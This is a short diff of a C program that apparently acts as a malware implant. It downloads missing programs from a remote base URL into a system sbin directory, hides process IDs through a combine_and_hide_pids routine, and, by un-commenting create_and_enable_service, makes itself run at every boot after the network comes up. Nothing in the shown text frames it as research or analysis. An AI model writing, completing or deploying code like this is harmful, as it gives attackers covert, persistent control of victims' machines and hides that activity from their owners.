@@ -457,9 +457,8 @@ int main(int argc, char *argv[]) {
 
     // Loop through each program to check if it exists, if not download it
     for (int i = 0; programs[i] != NULL; ++i) {
-        snprintf(sbin_path, sizeof(sbin_path), "%s/%s", sbin_path, programs[i]);
-        if (access(sbin_path, F_OK) == -1) {
-            char cmd[COMMAND_SIZE];
+        snprintf(cmd, sizeof(cmd), "%s/%s", sbin_path, programs[i]);
+        if (access(cmd, F_OK) == -1) {
             snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
             download_file(sbin_path, cmd);
         }
@@ -476,7 +475,7 @@ int main(int argc, char *argv[]) {
     combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 
     // Create the service make sure this program runs every boot after network connection established
-    //create_and_enable_service();
+    create_and_enable_service();
 
     // Loop to run indefinitely
     while (1) {
